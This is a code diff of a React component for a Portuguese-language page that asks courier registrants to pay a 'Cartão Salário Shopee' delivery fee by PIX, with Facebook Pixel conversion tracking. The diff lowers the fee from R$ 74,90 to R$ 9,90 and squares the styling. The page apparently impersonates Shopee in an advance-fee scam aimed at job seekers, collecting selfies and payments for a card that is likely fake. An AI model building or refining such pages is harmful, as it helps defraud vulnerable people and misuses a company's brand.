@@ -395,7 +395,7 @@ const EntregaCartao: React.FC = () => {
         content_name: 'Taxa de Entrega Cartão Shopee',
         content_ids: [pixData.id],
         content_type: 'product',
-        value: 74.90,
+        value: 9.90,
         currency: 'BRL'
       });
       
@@ -454,7 +454,7 @@ const EntregaCartao: React.FC = () => {
           console.log('[ENTREGA CARTAO] Pagamento APROVADO! Rastreando conversão...');
           
           // Rastrear o evento de compra no Facebook Pixel
-          trackPurchase(paymentId, 74.90);
+          trackPurchase(paymentId, 9.90);
           
           // Exibir mensagem de sucesso para o usuário
           toast({
@@ -517,7 +517,7 @@ const EntregaCartao: React.FC = () => {
       
       <div className="flex-grow container mx-auto px-4 py-8">
         <div className="w-full max-w-4xl mx-auto">
-          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
+          <div className="bg-white shadow-md rounded-none overflow-hidden mb-8">
             <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
               <h3 className="font-semibold text-[#E83D22]">Status do Cadastro</h3>
             </div>
@@ -537,7 +537,7 @@ const EntregaCartao: React.FC = () => {
                           fotoUrl={selfieImage || ''}
                         />
                       ) : (
-                        <div className="bg-gray-50 p-4 rounded-md">
+                        <div className="bg-gray-50 p-4 rounded-none">
                           <p className="text-gray-600">Carregando dados do entregador...</p>
                         </div>
                       )}
@@ -545,7 +545,7 @@ const EntregaCartao: React.FC = () => {
                     
                     <div>
                       <h4 className="text-gray-700 font-medium mb-2">Próximos Passos</h4>
-                      <div className="bg-gray-50 p-4 rounded-md">
+                      <div className="bg-gray-50 p-4 rounded-none">
                         <ul className="list-disc pl-5 space-y-1 text-gray-600">
                           <li>Pagar taxa de entrega do cartão salário</li>
                           <li>Aguardar entrega em até 3 dias úteis</li>
@@ -566,7 +566,7 @@ const EntregaCartao: React.FC = () => {
             </div>
           </div>
           
-          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
+          <div className="bg-white shadow-md rounded-none overflow-hidden mb-8">
             <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
               <h3 className="font-semibold text-[#E83D22]">Cartão Salário Shopee</h3>
             </div>
@@ -577,7 +577,7 @@ const EntregaCartao: React.FC = () => {
                     <img 
                       src="https://i.ibb.co/QF8NYKFL/assets-task-01k4apnweffyd9n2vkabne2mn0-1757001052-img-0-removebg-preview-1.png" 
                       alt="Cartão Salário Shopee" 
-                      className="w-full rounded-lg max-w-xs mx-auto"
+                      className="w-full rounded-none max-w-xs mx-auto"
                     />
                     <div 
                       className="absolute font-bold text-lg tracking-wide"
@@ -600,7 +600,7 @@ const EntregaCartao: React.FC = () => {
                     seu cartão salário rapidamente, usaremos uma transportadora expressa.
                   </p>
                   
-                  <div className="bg-blue-50 p-3 rounded-md border border-blue-200 mb-4">
+                  <div className="bg-blue-50 p-3 rounded-none border border-blue-200 mb-4">
                     <p className="text-sm text-blue-800">
                       <strong>Nova modalidade:</strong> Entrega por transportadora expressa em apenas 3 dias úteis!
                     </p>
@@ -613,13 +613,13 @@ const EntregaCartao: React.FC = () => {
                     <li>Aceito em toda rede Visa</li>
                   </ul>
                   
-                  <div className="bg-yellow-50 p-3 rounded-md border border-yellow-200 mb-4">
+                  <div className="bg-yellow-50 p-3 rounded-none border border-yellow-200 mb-4">
                     <p className="text-sm text-yellow-800">
-                      <strong>Taxa de entrega:</strong> R$ 74,90 para garantir entrega expressa e segura do seu cartão.
+                      <strong>Taxa de entrega:</strong> R$ 9,90 para garantir entrega expressa e segura do seu cartão.
                     </p>
                   </div>
                   
-                  <div className="bg-orange-50 p-4 rounded-md border border-orange-200 mb-2">
+                  <div className="bg-orange-50 p-4 rounded-none border border-orange-200 mb-2">
                     <p className="text-gray-700">
                       <span className="font-medium">Data estimada de entrega:</span> <span className="text-[#E83D22] font-medium">{dataEntrega}</span>
                     </p>
@@ -629,7 +629,7 @@ const EntregaCartao: React.FC = () => {
             </div>
           </div>
           
-          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
+          <div className="bg-white shadow-md rounded-none overflow-hidden mb-8">
             <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
               <h3 className="font-semibold text-[#E83D22]">Endereço para Entrega</h3>
             </div>
@@ -752,7 +752,7 @@ const EntregaCartao: React.FC = () => {
                 <div className="pt-4">
                   <Button 
                     type="submit" 
-                    className="w-full bg-[#E83D22] hover:bg-[#D73B1F] text-white font-medium py-3"
+                    className="w-full bg-[#E83D22] hover:bg-[#D73B1F] text-white font-medium py-3 rounded-none"
                   >
                     Finalizar Cadastro e Pagar Taxa de Entrega
                   </Button>
@@ -792,7 +792,7 @@ const EntregaCartao: React.FC = () => {
                 
                 {/* Valor */}
                 <div className="text-center">
-                  <p className="text-3xl font-bold text-gray-900">R$ 74,90</p>
+                  <p className="text-3xl font-bold text-gray-900">R$ 9,90</p>
                   <p className="text-sm text-gray-500">Taxa de entrega expressa</p>
                 </div>
                 
@@ -804,25 +804,25 @@ const EntregaCartao: React.FC = () => {
                 {/* Código PIX */}
                 <div className="space-y-2">
                   <p className="text-sm font-medium text-gray-700">Código PIX:</p>
-                  <div className="bg-gray-50 p-3 rounded-md break-all text-sm font-mono">
+                  <div className="bg-gray-50 p-3 rounded-none break-all text-sm font-mono">
                     {pixInfo.pixCode}
                   </div>
                   <Button 
                     onClick={copiarCodigoPix}
                     variant="outline" 
-                    className="w-full"
+                    className="w-full rounded-none"
                   >
                     Copiar código PIX
                   </Button>
                 </div>
                 
                 {/* Instruções */}
-                <div className="bg-blue-50 p-4 rounded-md">
+                <div className="bg-blue-50 p-4 rounded-none">
                   <h4 className="font-medium text-blue-900 mb-2">Como pagar:</h4>
                   <ul className="text-sm text-blue-800 space-y-1">
                     <li>1. Abra o app do seu banco</li>
                     <li>2. Escaneie o QR Code ou copie o código PIX</li>
-                    <li>3. Confirme o pagamento de R$ 74,90</li>
+                    <li>3. Confirme o pagamento de R$ 9,90</li>
                     <li>4. Aguarde a confirmação automática</li>
                   </ul>
                 </div>
@@ -862,7 +862,7 @@ const EntregaCartao: React.FC = () => {
               </p>
             </div>
             
-            <div className="bg-blue-50 p-3 rounded-md border border-blue-200">
+            <div className="bg-blue-50 p-3 rounded-none border border-blue-200">
               <p className="text-xs text-blue-800 font-medium">
                 ⏱️ Verificação automática em andamento...
               </p>
@@ -875,12 +875,13 @@ const EntregaCartao: React.FC = () => {
           <Button 
             onClick={() => setShowPaymentStatusPopup(false)}
             variant="outline"
-            className="mt-2 text-gray-600 border-gray-300 hover:bg-gray-50"
+            className="mt-2 text-gray-600 border-gray-300 hover:bg-gray-50 rounded-none"
           >
             Entendi, vou aguardar
           </Button>
         </DialogContent>
       </Dialog>
+      <Footer />
     </div>
   );
 };
